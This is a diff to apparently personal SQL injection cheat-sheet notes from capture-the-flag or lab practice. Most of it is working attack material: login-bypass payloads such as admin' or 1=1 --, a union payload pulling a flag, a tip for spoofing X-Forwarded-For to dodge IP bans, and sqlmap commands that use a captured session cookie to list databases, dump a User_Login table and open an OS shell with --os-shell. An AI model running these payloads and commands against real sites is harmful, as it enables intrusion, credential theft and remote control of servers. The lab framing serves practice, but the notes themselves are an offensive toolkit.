@@ -5,6 +5,7 @@ out of band
 Boolean-based 
 --------------
 username --> admin' AND 1=1#
+username --> admin' or 1=1 --
 
 Show how many columns with order by clause
 ---------------------------------------------
@@ -55,3 +56,16 @@ e.g Http header X-forwarded-for is changing the REAL IP to fake ip ----> X-forwa
 --headers="X-forwarded-for:1* (If server bans 1 IP address, we can use numerous fake IP to enumerate data from server)
 
 10.10.67.27/user?id=1 and 1=2 union all select '1 union all select 1,flag,3,4 from flag-- -',2,3 from sqhell_4.users limit 0,1-- -
+
+
+Viewprofile > get cookie > sqlmap
+---------------------------------
+When you get into the website > click view profile > inspect > document.cookie
+
+#sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-dbs
+#sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –D moviescope --tables
+#sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –D moviescope -t User_Login --dump
+
+sqlmap oshell with user-cookie
+-----------------------------
+#sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-os-shell
